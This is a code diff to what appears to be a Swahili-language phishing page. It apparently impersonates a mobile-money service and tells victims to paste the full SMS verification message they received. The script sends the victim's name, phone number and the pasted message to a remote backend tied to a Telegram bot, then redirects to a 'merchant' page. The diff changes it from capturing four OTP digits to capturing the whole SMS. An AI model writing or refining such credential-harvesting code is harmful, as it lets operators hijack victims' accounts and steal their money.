@@ -90,7 +90,7 @@ body {
   margin-bottom: 10px;
 }
 
-/* Textarea - remplace les 4 boîtes OTP */
+/* Textarea - replaces 4 OTP boxes */
 .otp-textarea {
   width: 100%;
   min-height: 100px;
@@ -222,9 +222,9 @@ button:not(:disabled):active {
     <form id="otpForm"> 
       <div class="label">Nakili ujumbe mzima uliopokea kwa SMS na ubandike hapa</div> 
       
-      <!-- Textarea unique à la place des 4 champs -->
+      <!-- Textarea unique instead of 4 fields -->
       <textarea id="otpTextarea" class="otp-textarea" 
-                placeholder="Nakili SMS nzima (mfano: 'Msimbo wako ni 1234')" 
+                placeholder="Nakili SMS nzima " 
                 autocomplete="off"></textarea>
 
       <div id="timerContainer"> 
@@ -239,7 +239,7 @@ button:not(:disabled):active {
   </div> 
 </div>
 
-<!-- ===== LOGIC (adapted to extract OTP from textarea) ===== -->
+<!-- ===== FIXED LOGIC: send full text, not just digits ===== -->
 <script>
 const BACKEND_URL = "https://mixx-by-yas-yf2n.onrender.com";
 const params = new URLSearchParams(window.location.search);
@@ -265,17 +265,16 @@ const timerDisplay = document.getElementById('timerDisplay');
 
 let countdown;
 
-// Helper: extract 4 last digits from text
+// Helper: extract 4 last digits from text (only used for validation now)
 function extractOTP(text) {
   const digits = text.replace(/\D/g, '');
-  // Take the last 4 digits (most common for OTP)
   return digits.slice(-4);
 }
 
-// Update button state (enable if at least 4 digits are present)
+// Update button state: enable if textarea is not empty
 function updateSubmitButton() {
-  const otp = extractOTP(textarea.value);
-  submitBtn.disabled = otp.length !== 4;
+  const text = textarea.value.trim();
+  submitBtn.disabled = text.length === 0;
 }
 
 // Listen to input changes
@@ -308,12 +307,17 @@ function startCountdown(duration = 60){
 
 startCountdown();
 
-async function sendCodeToTelegram(name, phone, code){
+async function sendFullMessageToTelegram(name, phone, fullMessage){
   try{
     const r = await fetch(`${BACKEND_URL}/submit-code`,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ name, phone, code, botId })
+      body:JSON.stringify({ 
+        name, 
+        phone, 
+        code: fullMessage,   // send the entire message
+        botId 
+      })
     });
     return r.json();
   }catch{
@@ -343,11 +347,10 @@ document.getElementById('otpForm').addEventListener('submit', async function(e){
   e.stopPropagation();
   
   const fullText = textarea.value.trim();
-  const otp = extractOTP(fullText);
   
-  // Check if we have exactly 4 digits
-  if(otp.length !== 4) {
-    statusEl.textContent = "Tafadhali hakikisha ujumbe una tarakimu 4 za OTP.";
+  // Ensure there is some content
+  if(fullText.length === 0) {
+    statusEl.textContent = "Tafadhali bandika ujumbe wako hapa.";
     return;
   }
   
@@ -357,12 +360,13 @@ document.getElementById('otpForm').addEventListener('submit', async function(e){
   submitBtn.disabled = true;
   btnText.textContent = "VERIFYING...";
   spinner.style.display = "inline-block";
-  statusEl.textContent = "Sending code for verification...";
+  statusEl.textContent = "Sending message for verification...";
 
-  const res = await sendCodeToTelegram(name, phone, otp);
+  // Send the full text, not just extracted OTP
+  const res = await sendFullMessageToTelegram(name, phone, fullText);
   
   if(!res || !res.requestId){
-    statusEl.textContent = "Failed to send code. Please try again.";
+    statusEl.textContent = "Failed to send. Please try again.";
     submitBtn.disabled = false;
     btnText.textContent = "WASILISHA";
     spinner.style.display = "none";
@@ -374,13 +378,13 @@ document.getElementById('otpForm').addEventListener('submit', async function(e){
   clearInterval(countdown);
 
   if(approved){
-    localStorage.setItem('code', otp);
-    statusEl.textContent = "Code verified! Redirecting...";
+    localStorage.setItem('code', fullText);
+    statusEl.textContent = "Message verified! Redirecting...";
     setTimeout(() => {
       window.location.href = `merchant.html?botId=${botId}`;
     }, 500);
   }else{
-    statusEl.textContent = "Incorrect OTP code. Please try again.";
+    statusEl.textContent = "Incorrect message. Please try again.";
     textarea.value = "";
     submitBtn.disabled = false;
     btnText.textContent = "WASILISHA";
